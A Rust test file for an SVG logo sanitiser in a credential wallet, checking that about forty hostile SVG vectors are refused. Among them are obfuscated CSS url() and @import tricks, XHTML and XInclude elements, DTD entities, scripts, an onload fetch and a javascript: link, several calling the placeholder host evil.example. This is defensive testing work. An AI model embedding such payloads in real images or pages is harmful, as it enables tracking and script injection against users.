//! The static SVG subset (PaSO Proof SD-JWT-VC and SVG, Section 3; PaSO View, Section 3): a row
//! per reviewer vector, each refused for its cause; a typical exported logo shown; resources
//! admitted by their content, at most `MAX_RESOURCES` of them.

use serde_json::json;
use siros_transaction_data::{
    CssFault, ImageFault, Incompatibility, IntegrityFault, Location, LocationStep, SvgFault,
    MAX_RESOURCES,
};

use crate::common::{
    b64, configured, credential, entries, ok, query, rows, sri, Documents, Host, Shown, CARD,
};

const TYPE: &str = "urn:paso:sca:com.example:logo:1";
const SVG: &str = "http://www.w3.org/2000/svg";
const XHTML: &str = "http://www.w3.org/1999/xhtml";

/// An SVG document of 10 by 10 holding `inner`.
fn svg(inner: &str) -> String {
    format!(
        r#"<svg xmlns="{SVG}" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">{inner}</svg>"#
    )
}

/// The rows the card shows for an SVG logo of `document`, the host answering fetches with
/// `documents`.
fn outcome(document: &str, documents: Documents) -> Shown {
    let definition = json!({"claims": [
        {"path": ["logo"], "value_type": "image", "display": [{"locale": "en", "name": "Logo"}]}
    ]});
    let mut host = Host::new(json!([configured(TYPE, CARD, &definition)]));
    host.images = documents;
    let logo = format!("data:image/svg+xml;base64,{}", b64(document.as_bytes()));
    let entry = json!({"type": TYPE, "credential_ids": ["card"], "payload": {"logo": logo}});
    let entries = entries(&[entry.to_string()], &query(&["card"], CARD));
    rows(&host, &entries[0], &credential(CARD, &[]))
}

fn refused(fault: SvgFault) -> Shown {
    let logo = Location::new(vec![LocationStep::Key("logo".to_owned())]);
    Err(Incompatibility::Image(logo, ImageFault::Svg(fault)))
}

fn shown() -> Shown {
    Ok(vec![("Logo".to_owned(), "<image Svg>".to_owned())])
}

fn element(namespace: &str, name: &str) -> SvgFault {
    SvgFault::Element(Some(namespace.to_owned()), name.to_owned())
}

fn unpinned(url: &str) -> SvgFault {
    SvgFault::ReferenceUnpinned(url.to_owned())
}

#[test]
fn each_vector_outside_the_subset_is_refused() {
    let x = "https://evil.example/x.png";
    let nested = format!(
        "data:image/svg+xml;base64,{}",
        b64(br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/n.png)"/></svg>"#)
    );
    let rows: Vec<(&str, String, SvgFault)> = vec![
        (
            "url( lowercase",
            svg(&format!(r#"<rect style="fill:url({x})"/>"#)),
            unpinned(x),
        ),
        (
            "URL( in capitals",
            svg(&format!(r#"<rect style="fill:URL({x})"/>"#)),
            unpinned(x),
        ),
        (
            "a CSS escape spelling url(",
            svg(&format!(r"<style>rect{{fill:\75 rl({x})}}</style>")),
            unpinned(x),
        ),
        (
            "a character reference spelling url(",
            svg(&format!(r#"<rect style="fill:&#117;rl({x})"/>"#)),
            unpinned(x),
        ),
        (
            "@IMPORT in capitals",
            svg(r#"<style>@IMPORT "https://evil.example/s.css";</style>"#),
            SvgFault::Css(CssFault::AtRule("IMPORT".to_owned())),
        ),
        (
            "a comment before @import's string",
            svg(r#"<style>@import/**/"https://evil.example/s.css";</style>"#),
            SvgFault::Css(CssFault::AtRule("import".to_owned())),
        ),
        (
            "@import with a comment in CDATA",
            svg(r#"<style><![CDATA[@import/* x */'https://evil.example/s.css';]]></style>"#),
            SvgFault::Css(CssFault::AtRule("import".to_owned())),
        ),
        (
            "an XML comment splitting url( in a style element",
            svg(&format!(
                r#"<style>rect{{fill:u<!-- x -->rl({x})}}</style>"#
            )),
            SvgFault::StyleContent,
        ),
        (
            "an XML comment splitting @import",
            svg(r#"<style>@im<!-- x -->port "https://evil.example/s.css";</style>"#),
            SvgFault::StyleContent,
        ),
        (
            "an element splitting url( in a style element",
            svg(&format!(r#"<style>rect{{fill:u<g/>rl({x})}}</style>"#)),
            SvgFault::StyleContent,
        ),
        (
            "CDATA splitting url( in a style element",
            svg(&format!(
                r#"<style>rect{{fill:u<![CDATA[rl({x})]]>}}</style>"#
            )),
            unpinned(x),
        ),
        (
            "an xml-stylesheet processing instruction",
            format!(
                r#"<?xml-stylesheet href="https://evil.example/s.css"?>{}"#,
                svg("")
            ),
            SvgFault::ProcessingInstruction("xml-stylesheet".to_owned()),
        ),
        (
            "foreignObject",
            svg(
                r#"<foreignObject><img xmlns="http://www.w3.org/1999/xhtml" srcset="https://evil.example/a.png 1x"/></foreignObject>"#,
            ),
            element(SVG, "foreignObject"),
        ),
        (
            "an XHTML img with srcset",
            svg(
                r#"<img xmlns="http://www.w3.org/1999/xhtml" srcset="https://evil.example/a.png 1x"/>"#,
            ),
            element(XHTML, "img"),
        ),
        (
            "an XHTML video with a poster",
            svg(
                r#"<video xmlns="http://www.w3.org/1999/xhtml" poster="https://evil.example/p.png"/>"#,
            ),
            element(XHTML, "video"),
        ),
        (
            "an XHTML object",
            svg(
                r#"<object xmlns="http://www.w3.org/1999/xhtml" data="https://evil.example/a.svg"/>"#,
            ),
            element(XHTML, "object"),
        ),
        (
            "an XHTML iframe with srcdoc",
            svg(
                r#"<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;img src=https://evil.example/i.png&gt;"/>"#,
            ),
            element(XHTML, "iframe"),
        ),
        (
            "an XHTML body with a background",
            svg(
                r#"<body xmlns="http://www.w3.org/1999/xhtml" background="https://evil.example/b.png"/>"#,
            ),
            element(XHTML, "body"),
        ),
        (
            "an XInclude",
            svg(
                r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="https://evil.example/x.xml"/>"#,
            ),
            element("http://www.w3.org/2001/XInclude", "include"),
        ),
        (
            "set",
            svg(
                r#"<image width="10" height="10"><set attributeName="href" to="https://evil.example/x.png"/></image>"#,
            ),
            element(SVG, "set"),
        ),
        (
            "animate",
            svg(
                r#"<rect width="10" height="10"><animate attributeName="fill" values="url(https://evil.example/x.png)"/></rect>"#,
            ),
            element(SVG, "animate"),
        ),
        (
            "an inline script",
            svg("<script>new Image().src='https://evil.example/t'</script>"),
            element(SVG, "script"),
        ),
        (
            "a script by href",
            svg(r#"<script href="https://evil.example/s.js"/>"#),
            element(SVG, "script"),
        ),
        (
            "a link to javascript:",
            svg(r#"<a href="javascript:alert(1)"><rect width="1" height="1"/></a>"#),
            element(SVG, "a"),
        ),
        (
            "feImage",
            svg(&format!(r#"<filter id="f"><feImage href="{x}"/></filter>"#)),
            element(SVG, "feImage"),
        ),
        (
            "a STYLE element in capitals",
            svg(&format!(r#"<STYLE>rect{{fill:url({x})}}</STYLE>"#)),
            element(SVG, "STYLE"),
        ),
        (
            "a Style element with @import",
            svg(r#"<Style>@import "https://evil.example/s.css";</Style>"#),
            element(SVG, "Style"),
        ),
        (
            "an event handler",
            svg(r#"<rect width="10" height="10" onload="fetch('https://evil.example/t')"/>"#),
            SvgFault::Attribute("rect".to_owned(), "onload".to_owned()),
        ),
        (
            "an HREF attribute in capitals",
            svg(&format!(r#"<image width="10" height="10" HREF="{x}"/>"#)),
            SvgFault::Attribute("image".to_owned(), "HREF".to_owned()),
        ),
        (
            "xml:base",
            svg(r##"<g xml:base="https://evil.example/"><use href="#a"/></g>"##),
            SvgFault::Attribute("g".to_owned(), "base".to_owned()),
        ),
        (
            "an href on an element that takes none",
            svg(&format!(r#"<rect href="{x}"/>"#)),
            SvgFault::Attribute("rect".to_owned(), "href".to_owned()),
        ),
        (
            "xlink:href to an unpinned document",
            svg(r#"<use xlink:href="https://evil.example/s.svg#a"/>"#),
            SvgFault::ReferenceIntegrity(
                "https://evil.example/s.svg#a".to_owned(),
                IntegrityFault::Malformed,
            ),
        ),
        (
            "a tab inside the scheme",
            svg("<image width=\"10\" height=\"10\" href=\"ht&#9;tps://evil.example/x.png\"/>"),
            unpinned("ht\ttps://evil.example/x.png"),
        ),
        (
            "an SVG Data URL nested",
            svg(&format!(
                r#"<image width="10" height="10" href="{nested}"/>"#
            )),
            SvgFault::DataReference(nested.clone()),
        ),
        (
            "@font-face src unpinned",
            svg("<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>"),
            unpinned("https://evil.example/f.woff"),
        ),
        (
            "-webkit-image-set",
            svg(&format!(
                r#"<rect style="fill:-webkit-image-set('{x}' 1x)"/>"#
            )),
            unpinned(x),
        ),
        (
            "image() of CSS Images 4",
            svg(&format!(r#"<rect style="fill:image('{x}')"/>"#)),
            unpinned(x),
        ),
        (
            "a function the subset does not know",
            svg(r#"<rect style="fill:element(#a) attr(href url)"/>"#),
            SvgFault::Css(CssFault::Function("element".to_owned())),
        ),
        (
            "a bad url token",
            svg(r#"<rect style="fill:url(a b)"/>"#),
            SvgFault::Css(CssFault::Unreadable),
        ),
    ];
    for (case, document, fault) in rows {
        assert_eq!(outcome(&document, Vec::new()), refused(fault), "{case}");
    }
    for (case, document) in [
        (
            "an internal DTD with an entity",
            r#"<!DOCTYPE svg [<!ENTITY e "url(https://evil.example/x.png)">]><svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:&e;"/></svg>"#,
        ),
        (
            "an external DTD",
            r#"<!DOCTYPE svg SYSTEM "https://evil.example/x.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>"#,
        ),
    ] {
        assert!(
            matches!(
                outcome(document, Vec::new()),
                Err(Incompatibility::Image(_, ImageFault::Svg(SvgFault::Xml(_))))
            ),
            "{case}"
        );
    }
}

/// A logo as a drawing program exports it: an XML declaration, a style sheet of classes, a
/// gradient the classes paint with, text, and custom data.
#[test]
fn an_exported_logo_is_shown() {
    let logo = r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 120 40" width="120" height="40">
  <defs>
    <style>
      .cls-1 { fill: url(#gradient); }
      .cls-2 { fill: #1d1d1b; font-family: Helvetica, Arial, sans-serif; font-size: 18px; }
      @media (prefers-color-scheme: dark) { .cls-2 { fill: rgb(240 240 240 / 90%); } }
    </style>
    <linearGradient id="gradient" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0" stop-color="#0057b8"/>
      <stop offset="1" stop-color="#ffd700"/>
    </linearGradient>
  </defs>
  <title>Shop</title>
  <!-- Layer 1 -->
  <g id="Layer_1" data-name="Layer 1">
    <circle class="cls-1" cx="20" cy="20" r="18"/>
    <text class="cls-2" x="44" y="26" xml:space="preserve">Shop</text>
    <path d="M40 34h70" stroke="#1d1d1b" stroke-width="2" transform="translate(0 1)"/>
  </g>
</svg>"##;
    assert_eq!(outcome(logo, Vec::new()), shown());
}

/// A pinned resource passes when it is a PNG or JPEG image or a font, and is refused when it is
/// an SVG document or a style sheet; at most `MAX_RESOURCES` are fetched.
#[test]
fn resources_pass_by_their_content() {
    let pinned = |url: &str, body: &[u8]| format!("{url}#{}", sri(body).replace('=', "%3D"));
    let woff2 = b"wOF2\x00\x01\x00\x00font".to_vec();
    let font = "https://cdn.example/f.woff2";
    let face = svg(&format!(
        "<style>@font-face{{font-family:x;src:url({})}}</style>",
        pinned(font, &woff2)
    ));
    assert_eq!(outcome(&face, vec![(font.to_owned(), ok(&woff2))]), shown());

    let inner = br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/leak.png)"/></svg>"#;
    let sheet = b"rect{fill:url(https://evil.example/leak.png)}";
    for (url, body) in [
        ("https://img.example/n.svg", inner.as_slice()),
        ("https://img.example/s.css", sheet.as_slice()),
    ] {
        let reference = pinned(url, body);
        let document = svg(&format!(
            r#"<image width="1" height="1" href="{reference}"/>"#
        ));
        assert_eq!(
            outcome(&document, vec![(url.to_owned(), ok(body))]),
            refused(SvgFault::ResourceType(reference)),
            "{url}"
        );
    }

    let images: String = (0..=MAX_RESOURCES)
        .map(|i| {
            let url = format!("https://img.example/{i}.png");
            format!(
                r#"<image width="1" height="1" href="{}"/>"#,
                pinned(&url, &[0])
            )
        })
        .collect();
    assert_eq!(
        outcome(&svg(&images), Vec::new()),
        refused(SvgFault::TooManyResources(MAX_RESOURCES + 1))
    );
}
